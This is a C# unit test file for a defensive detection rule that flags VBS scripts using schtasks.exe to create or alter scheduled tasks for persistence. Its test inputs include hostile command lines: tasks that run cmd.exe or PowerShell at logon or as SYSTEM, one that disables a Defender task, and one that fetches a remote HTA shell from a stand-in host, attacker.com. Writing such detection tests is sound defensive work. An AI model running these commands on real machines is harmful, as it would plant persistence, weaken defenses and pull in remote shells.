using System;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Tests for VbsScheduledTaskCreationRule (restored cmdschedule detection).
    /// Verifies that VBS scripts creating scheduled tasks are detected as Tier2 indicators.
    /// </summary>
    public class VbsScheduledTaskRuleTests
    {
        private readonly VbsScheduledTaskCreationRule _rule = new(NullLogger<VbsScheduledTaskCreationRule>.Instance);

        private static FusedTelemetryContext MakeContext(
            string processName, int pid,
            string? parentProcessName = null,
            string commandLine = "",
            string imagePath = "")
        {
            return new FusedTelemetryContext
            {
                ProcessId = pid,
                ProcessName = processName,
                TriggeringEvent = new ProcessTelemetry
                {
                    ProcessName = processName,
                    ProcessId = pid,
                    ParentProcessName = parentProcessName,
                    CommandLine = commandLine,
                    ImagePath = imagePath
                }
            };
        }

        // Pattern 1: cscript/wscript spawning schtasks.exe

        [Fact]
        public void Fires_WhenCscriptSpawnsSchTasksCreate()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 1000,
                parentProcessName: "cscript.exe",
                commandLine: "schtasks.exe /create /tn Malware /tr cmd.exe /sc onlogon"
            ));
            Assert.NotNull(result);
            Assert.Contains("VBS", result!.RuleName);
            Assert.Equal(DetectionTier.Tier2Indicator, result.Tier);
            Assert.Equal(ResponseAction.LogOnly, result.AuthorizedResponse);
        }

        [Fact]
        public void Fires_WhenWscriptSpawnsSchTasksChange()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 1001,
                parentProcessName: "wscript.exe",
                commandLine: "schtasks.exe /change /tn Microsoft\\Windows\\Defender /disable"
            ));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier2Indicator, result.Tier);
        }

        // Pattern 2: VBS file creates scheduled task

        [Fact]
        public void Fires_WhenVbsFileTriggersTaskCreation()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 2000,
                commandLine: "schtasks.exe /create /tn Update /tr powershell.exe /sc minute /mo 5",
                imagePath: "C:\\script.vbs"
            ));
            Assert.NotNull(result);
            Assert.Contains("VBS", result!.RuleName);
        }

        // Pattern 3: Suspicious task creation patterns

        [Fact]
        public void Fires_OnSuspiciousSystemScope()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 3000,
                parentProcessName: "cscript.exe",
                commandLine: "schtasks.exe /create /tn Hidden /tr cmd.exe /ru SYSTEM"
            ));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier2Indicator, result.Tier);
        }

        [Fact]
        public void Fires_OnSuspiciousPayloadInTaskAction()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 3001,
                parentProcessName: "wscript.exe",
                commandLine: "schtasks.exe /create /tn System /tr \"mshta http://attacker.com/shell.hta\""
            ));
            Assert.NotNull(result);
        }

        [Fact]
        public void Fires_OnRunDll32InTaskAction()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 3002,
                parentProcessName: "cscript.exe",
                commandLine: "schtasks.exe /create /tn Update /tr \"rundll32.exe shell32.dll,Control_RunDLL\""
            ));
            Assert.NotNull(result);
        }

        // False negatives (should NOT fire)

        [Fact]
        public void DoesNotFire_WhenNonVbsParentSpawnsSchTasks()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 4000,
                parentProcessName: "explorer.exe",
                commandLine: "schtasks.exe /create /tn DailyBackup /tr backup.bat"
            ));
            Assert.Null(result);
        }

        [Fact]
        public void DoesNotFire_OnLegitimateAdminTask()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 4001,
                parentProcessName: "powershell.exe",
                commandLine: "schtasks.exe /create /tn \"Microsoft\\Windows\\Defender\\NotificationTask\""
            ));
            Assert.Null(result);
        }

        [Fact]
        public void DoesNotFire_OnOtherProcess()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "notepad.exe",
                pid: 5000,
                parentProcessName: "cscript.exe"
            ));
            Assert.Null(result);
        }

        // Detection properties

        [Fact]
        public void Detection_ContainsMetadata()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 6000,
                parentProcessName: "cscript.exe",
                commandLine: "schtasks.exe /create /tn Task /tr cmd.exe"
            ));
            Assert.NotNull(result);
            Assert.True(result!.Metadata.ContainsKey("detection_category"));
            Assert.Equal("VBS Persistence", result.Metadata["detection_category"]);
            Assert.True(result.Metadata.ContainsKey("mitre_technique"));
            Assert.Equal("T1053.005", result.Metadata["mitre_technique"]);
            Assert.True(result.Metadata.ContainsKey("composite_component"));
            Assert.Equal("cmdschedule", result.Metadata["composite_component"]);
        }

        [Fact]
        public void Detection_HasCorrectTierAndResponse()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 6001,
                parentProcessName: "wscript.exe",
                commandLine: "schtasks.exe /create /tn Malware /tr powershell.exe"
            ));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier2Indicator, result!.Tier);
            Assert.Equal(ResponseAction.LogOnly, result.AuthorizedResponse);
            Assert.False(result.KillAuthorized);
            Assert.Equal(SignalType.SuspiciousProcess, result.SignalType);
        }

        [Fact]
        public void Detection_HasProperConfidence()
        {
            var result = _rule.Evaluate(MakeContext(
                processName: "schtasks.exe",
                pid: 6002,
                parentProcessName: "cscript.exe",
                commandLine: "schtasks.exe /create /tn Hidden /tr cmd.exe"
            ));
            Assert.NotNull(result);
            Assert.Equal(0.70, result!.Confidence);
        }

        // Non-ProcessTelemetry events

        [Fact]
        public void DoesNotFire_OnNetworkTelemetry()
        {
            var ctx = new FusedTelemetryContext
            {
                ProcessId = 7000,
                ProcessName = "schtasks.exe",
                TriggeringEvent = new NetworkTelemetry { ProcessName = "schtasks.exe", ProcessId = 7000 }
            };
            Assert.Null(_rule.Evaluate(ctx));
        }

        [Fact]
        public void DoesNotFire_OnFileTelemetry()
        {
            var ctx = new FusedTelemetryContext
            {
                ProcessId = 7001,
                ProcessName = "schtasks.exe",
                TriggeringEvent = new FileActivityTelemetry { ProcessName = "schtasks.exe", ProcessId = 7001 }
            };
            Assert.Null(_rule.Evaluate(ctx));
        }
    }
}
